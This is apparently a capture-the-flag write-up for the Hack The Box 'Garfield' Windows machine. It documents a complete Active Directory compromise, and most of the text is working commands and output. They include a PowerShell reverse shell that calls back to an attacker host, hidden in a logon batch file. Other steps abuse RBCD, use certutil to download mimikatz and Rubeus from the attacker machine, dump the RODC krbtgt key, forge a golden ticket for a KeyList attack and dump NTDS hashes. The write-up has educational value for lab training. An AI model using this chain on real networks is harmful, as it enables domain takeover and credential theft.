<div align="center">

# Garfield — HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)

<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**


---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Target Information

| Property | Value |
|----------|-------|
| Machine | Garfield |
| IP | `<TARGET_IP>` |
| OS | Windows |
| Difficulty | Hard |
| Hostname | garfield.htb |

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Attack Chain](#attack-chain)
3. [Lab Details](#lab-details)
4. [Recon](#recon)
5. [Validate Initial Access](#validate-initial-access)
6. [ACL Enumeration and Path Discovery](#acl-enumeration-and-path-discovery)
7. [Exploit Logon Script via scriptPath](#exploit-logon-script-via-scriptpath)
8. [Move from l.wilson to l.wilson_adm](#move-from-lwilson-to-lwilson_adm)
9. [Confirm Privileges](#confirm-privileges)
10. [Add Self to RODC Administrators](#add-self-to-rodc-administrators)
11. [Pivot to Internal RODC01](#pivot-to-internal-rodc01)
12. [Confirm Access to RODC01](#confirm-access-to-rodc01)
13. [Create a Fake Machine Account](#create-a-fake-machine-account)
14. [Configure RBCD on RODC01](#configure-rbcd-on-rodc01)
15. [Impersonate Administrator to RODC01](#impersonate-administrator-to-rodc01)
16. [Dump krbtgt_8245 AES256 Key](#dump-krbtgt_8245-aes256-key)
17. [Modify RODC Replication Policy](#modify-rodc-replication-policy)
18. [Golden Ticket and KeyList Attack](#golden-ticket-and-keylist-attack)
19. [Convert the Ticket on Kali](#convert-the-ticket-on-kali)
20. [Dump NTDS with the Real Administrator Ticket](#dump-ntds-with-the-real-administrator-ticket)
21. [Final Administrator Shell and Root Flag](#final-administrator-shell-and-root-flag)
22. [Key Takeaways](#key-takeaways)
23. [Flags](#flags)

---

## Executive Summary

This machine hinged on abusing Active Directory ACLs to gain code execution through a user logon script, pivoting to a Tier 1 administrative account, reaching an internal Read-Only Domain Controller (RODC) through a tunnel, abusing RBCD, extracting the RODC-specific `krbtgt_8245` key, and finally using an RODC Golden Ticket + KeyList attack to obtain a real Administrator ticket for the primary DC.

---

## Attack Chain

```text
j.arbuckle
  -> writable ACLs on l.wilson and l.wilson_adm
  -> scriptPath abuse on l.wilson
  -> reverse shell as l.wilson
  -> reset l.wilson_adm password
  -> Evil-WinRM as l.wilson_adm
  -> add self to RODC Administrators
  -> pivot to internal RODC01
  -> create machine account FAKE$
  -> configure RBCD on RODC01
  -> impersonate Administrator to RODC01
  -> SYSTEM on RODC01
  -> dump krbtgt_8245 AES256 key
  -> modify RODC replication policy
  -> forge RODC Golden Ticket
  -> KeyList request to DC01
  -> real Administrator ticket
  -> NTDS dump
  -> Evil-WinRM as Administrator
  -> root.txt
```

---

## Lab Details

| Property | Value |
|----------|-------|
| Target IP | `<TARGET_IP>` |
| Domain | garfield.htb |
| DC | DC01.garfield.htb |
| Internal RODC | RODC01.garfield.htb / 192.168.100.2 |
| Initial Creds | j.arbuckle : Th1sD4mnC4t!@1978 |

---

## Recon

### Set Variables

```bash
export TARGET_IP="<TARGET_IP>"
export ATTACKER_IP="<YOUR_IP>"
export DOMAIN="garfield.htb"
export USER="j.arbuckle"
export PASS='Th1sD4mnC4t!@1978'
echo "$TARGET_IP DC01.garfield.htb garfield.htb" | sudo tee -a /etc/hosts
```

### Scan the Host

```bash
nmap -sC -sV $TARGET_IP
```

<details>
<summary>Nmap Output (click to expand)</summary>

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0

clock-skew: +8h
```

</details>

### Notes

- `5985/tcp` exposed WinRM
- `445/tcp` exposed SMB
- `389/tcp` exposed LDAP
- Significant clock skew made several Kerberos paths unreliable early on

---

## Validate Initial Access

### Enumerate Shares

```bash
nxc smb $TARGET_IP -u $USER -p "$PASS" --shares
```

```text
SMB  <TARGET_IP>  445  DC01  [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB  <TARGET_IP>  445  DC01  Share      Permissions
SMB  <TARGET_IP>  445  DC01  IPC$       READ
SMB  <TARGET_IP>  445  DC01  NETLOGON   READ
SMB  <TARGET_IP>  445  DC01  SYSVOL     READ
```

Initial credentials were valid and sufficient for SMB + LDAP-backed domain enumeration.

---

## ACL Enumeration and Path Discovery

### Enumerate Writable AD Objects

```bash
bloodyAD --host $DOMAIN -u $USER -p "$PASS" get writable
```

Relevant findings:

- Liz Wilson
- Liz Wilson ADM

Although graphing/ACL tools exposed multiple theoretical paths, the practical and intended path was:

- Writeable `scriptPath` on `l.wilson`
- Later password reset path affecting `l.wilson_adm`

---

## Exploit Logon Script via scriptPath

### Generate a PowerShell Reverse Shell Payload

```bash
echo '$client = New-Object System.Net.Sockets.TCPClient("'"$ATTACKER_IP"'",9001);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback=(iex $data 2>&1|Out-String);
$sendback2=$sendback+"PS "+(pwd).Path+"> ";
$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
$client.Close()' | iconv -t UTF-16LE | base64 -w0
```

### Build printerDetect.bat

```bash
cat > /tmp/printerDetect.bat << 'EOF'
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64_PAYLOAD>
EOF
```

### Upload the Batch File

```bash
smbclient //$TARGET_IP/SYSVOL -U $USER%"$PASS"
```

Inside `smbclient`:

```text
cd garfield.htb\scripts
put /tmp/printerDetect.bat printerDetect.bat
dir
exit
```

Output:

```text
putting file /tmp/printerDetect.bat as \garfield.htb\scripts\printerDetect.bat
```

### Set scriptPath on l.wilson

```bash
bloodyAD --host $DOMAIN -u $USER -p "$PASS" \
set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
scriptPath -v printerDetect.bat
```

Output:

```text
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

### Catch the Shell

```bash
nc -lvnp 9001
```

Output:

```text
connect to [<YOUR_IP>] from (UNKNOWN) [<TARGET_IP>] 51335
whoami
garfield\l.wilson
hostname
DC01
pwd

Path
----
C:\Windows\system32
```

Code execution as `garfield\l.wilson` on DC01 confirmed.

---

## Move from l.wilson to l.wilson_adm

### Reset l.wilson_adm Password from the Reverse Shell

In the `l.wilson` PowerShell shell:

```powershell
Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword (ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force) -Reset
```

### Validate WinRM Access

```bash
nxc winrm $TARGET_IP -u l.wilson_adm -p 'WhoKnows123!'
```

Output:

```text
WINRM  <TARGET_IP>  5985  DC01  [+] garfield.htb\l.wilson_adm:WhoKnows123! (Pwn3d!)
```

### Get a Shell as l.wilson_adm

```bash
evil-winrm -i <TARGET_IP> -u l.wilson_adm -p 'WhoKnows123!'
```

Output:

```text
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents>
```

### Capture user.txt

```powershell
cd C:\Users\l.wilson_adm\Desktop
type user.txt
```

Output:

```text
507962c068a3688.................
```

User flag captured.

---

## Confirm Privileges

### Enumerate Groups and Privileges

```powershell
whoami /groups
whoami /priv
```

Key findings:

- Member of Tier 1
- Had SeMachineAccountPrivilege

This made the next phase possible.

---

## Add Self to RODC Administrators

In the `l.wilson_adm` WinRM shell:

```powershell
Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
```

Command completed silently and successfully.

---

## Pivot to Internal RODC01

### Confirm Internal Reachability from DC01

```powershell
ping 192.168.100.2
```

Output:

```text
Reply from 192.168.100.2: bytes=32 time<1ms TTL=128
```

### Set up Ligolo on Kali

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

Ligolo output:

```text
INFO[0000] Listening on 0.0.0.0:11601
INFO[0116] Agent joined. id=00155d0bdd00 name="GARFIELD\\l.wilson_adm@DC01"
```

### Run Agent from WinRM

```powershell
.\agent.exe -connect <YOUR_IP>:11601 -ignore-cert
```

### Add Route on Kali

```bash
sudo ip route add 192.168.100.0/24 dev ligolo
ping 192.168.100.2
```

Output:

```text
64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=112 ms
...
```

Pivot established.

---

## Confirm Access to RODC01

```bash
nxc smb 192.168.100.2 -u l.wilson_adm -p 'WhoKnows123!'
```

Output:

```text
SMB  192.168.100.2  445  RODC01  [+] garfield.htb\l.wilson_adm:WhoKnows123!
```

---

## Create a Fake Machine Account

### Add a Computer Object

```bash
impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
-computer-name 'FAKE$' \
-computer-pass 'FakePass123!' \
-dc-ip <TARGET_IP>
```

### Verify

```bash
nxc ldap <TARGET_IP> -u l.wilson_adm -p 'WhoKnows123!' --users | grep FAKE
```

---

## Configure RBCD on RODC01

### Set Delegation in WinRM

```powershell
Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$
Get-ADComputer RODC01 -Properties PrincipalsAllowedToDelegateToAccount
```

Output:

```text
PrincipalsAllowedToDelegateToAccount : {CN=FAKE,CN=Computers,DC=garfield,DC=htb}
```

RBCD configured.

---

## Impersonate Administrator to RODC01

### Request Service Ticket

```bash
impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
-spn cifs/RODC01.garfield.htb \
-impersonate Administrator \
-dc-ip <TARGET_IP>
```

Output:

```text
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

### Export Ticket

```bash
export KRB5CCNAME=$(pwd)/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
echo $KRB5CCNAME
```

### Get SYSTEM on RODC01

```bash
impacket-psexec -k -no-pass \
-dc-ip <TARGET_IP> \
-target-ip 192.168.100.2 \
garfield.htb/Administrator@RODC01.garfield.htb
```

Output:

```text
[*] Found writable share ADMIN$
[*] Uploading file ...
[*] Opening SVCManager ...
[*] Creating service ...
[*] Starting service ...
Microsoft Windows [Version 10.0.17763.8511]

C:\Windows\system32> whoami
nt authority\system
```

SYSTEM on RODC01 achieved.

---

## Dump krbtgt_8245 AES256 Key

### Serve Mimikatz from Kali

```bash
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /tmp/
cd /tmp
python3 -m http.server 8888
```

### Download Mimikatz on RODC01

```cmd
cd C:\Windows\Temp
certutil -urlcache -split -f http://<YOUR_IP>:8888/mimikatz.exe mimikatz.exe
mimikatz.exe
```

Inside mimikatz:

```text
privilege::debug
lsadump::lsa /inject /name:krbtgt_8245
```

<details>
<summary>Mimikatz Output (click to expand)</summary>

```text
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
```

</details>

### Critical Values

- AES256: `d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240`
- SID: `S-1-5-21-2502726253-3859040611-225969357`
- RODC number: `8245`

---

## Modify RODC Replication Policy

### Load PowerView in WinRM

Serve PowerView from Kali:

```bash
cd /usr/share/windows-resources/powersploit/Recon/
python3 -m http.server 8888
```

In WinRM:

```powershell
cd C:\Users\l.wilson_adm\Desktop
certutil -urlcache -split -f http://<YOUR_IP>:8888/PowerView.ps1 PowerView.ps1
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-Command *DomainObject*
```

### Allow Administrator for RODC Password Replication

```powershell
Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}
Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
Get-ADComputer RODC01 -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup
```

Output:

```text
msDS-RevealOnDemandGroup : {CN=Allowed RODC Password Replication Group,..., CN=Administrator,...}
```

Replication policy correctly modified.

---

## Golden Ticket and KeyList Attack

### Get Rubeus

On Kali:

```bash
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe -O /tmp/Rubeus.exe
cd /tmp
python3 -m http.server 8888
```

In WinRM:

```powershell
certutil -urlcache -split -f http://<YOUR_IP>:8888/Rubeus.exe Rubeus.exe
dir Rubeus.exe
.\Rubeus.exe
```

Version:

```text
v2.3.3
```

### Forge the RODC Golden Ticket

```powershell
.\Rubeus.exe golden `
/rodcNumber:8245 `
/flags:forwardable,renewable,enc_pa_rep `
/nowrap `
/outfile:ticket.kirbi `
/aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 `
/user:Administrator `
/id:500 `
/domain:garfield.htb `
/sid:S-1-5-21-2502726253-3859040611-225969357
```

Output:

```text
[*] Forged a TGT for 'Administrator@garfield.htb'
[*] Ticket written to ticket_2026_04_06_00_56_46_Administrator_to_krbtgt@GARFIELD.HTB.kirbi
```

### Perform KeyList Attack

```powershell
.\Rubeus.exe asktgs `
/enctype:aes256 `
/keyList `
/service:krbtgt/garfield.htb `
/dc:DC01.garfield.htb `
/ticket:ticket_2026_04_06_00_56_46_Administrator_to_krbtgt@GARFIELD.HTB.kirbi `
/nowrap
```

Output:

```text
[+] TGS request successful!
[*] base64(ticket.kirbi):
doIFnjCCBZqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMR0FSRklFTEQuSFRCo4IEaTCCBGWgAwIBEqEDAgEC...
```

Real Administrator ticket retrieved.

---

## Convert the Ticket on Kali

### Save the Base64 Blob

```bash
nano /tmp/ticket.b64
```

Paste only the base64 string.

### Decode and Convert

```bash
sed -i 's/^[[:space:]]*//' /tmp/ticket.b64
tr -d '\r\n\t ' < /tmp/ticket.b64 | base64 -d > /tmp/ticket.kirbi
ls -l /tmp/ticket.kirbi
xxd -l 8 /tmp/ticket.kirbi
```

Output:

```text
-rw-r--r-- 1 root root 1442 Apr  5 21:00 ticket.kirbi
00000000: 7682 059e 3082 059a  v...0...
```

### Convert to ccache

```bash
impacket-ticketConverter /tmp/ticket.kirbi /tmp/ticket.ccache
export KRB5CCNAME=/tmp/ticket.ccache
echo $KRB5CCNAME
```

---

## Dump NTDS with the Real Administrator Ticket

```bash
nxc smb DC01.garfield.htb --use-kcache --ntds
```

<details>
<summary>NTDS Dump Output (click to expand)</summary>

```text
[+] GARFIELD.HTB\Administrator from ccache (Pwn3d!)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5:::
Guest:501:...
krbtgt:502:...
krbtgt_8245:1603:...
garfield.htb\j.arbuckle:...
garfield.htb\l.wilson:...
garfield.htb\l.wilson_adm:...
DC01$:...
RODC01$:...
FAKE$:...
```

</details>

Administrator NT hash obtained:

```text
ee238f6debc75201████████████████
```

---

## Final Administrator Shell and Root Flag

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H 'ee238f6debc752010428f20875b092d5'
```

Inside the shell:

```powershell
whoami
type C:\Users\Administrator\Desktop\root.txt
```

Output:

```text
garfield\administrator
9490fac0230b0e2.................
```

Root flag captured.

---

## Key Takeaways

### ACLs Matter -- but Effective Write Paths Matter More

Multiple theoretical edges existed, but the practical chain relied on `scriptPath` and later domain object manipulation.

### RODCs Are a Different Beast

This box required understanding the difference between `krbtgt` and `krbtgt_<RODCID>`.

### KeyList Is the Real Win Condition

The forged RODC ticket was not the end goal. The real goal was using KeyList to get a legitimate Administrator ticket from the primary DC.

### Ticket Hygiene Matters

Small issues like wrong ccache filename, wrong `.kirbi` filename, or malformed base64 caused failures until corrected.

---

## Flags

| Flag | Value |
|------|-------|
| User | `507962c068a3688█████████████████` |
| Root | `9490fac0230b0e2█████████████████` |

---

<div align="center">

**Written by MrsNobody**

<img src="../assets/MrsNobody.png" width="80">

*Hack The Box — Garfield*

</div>
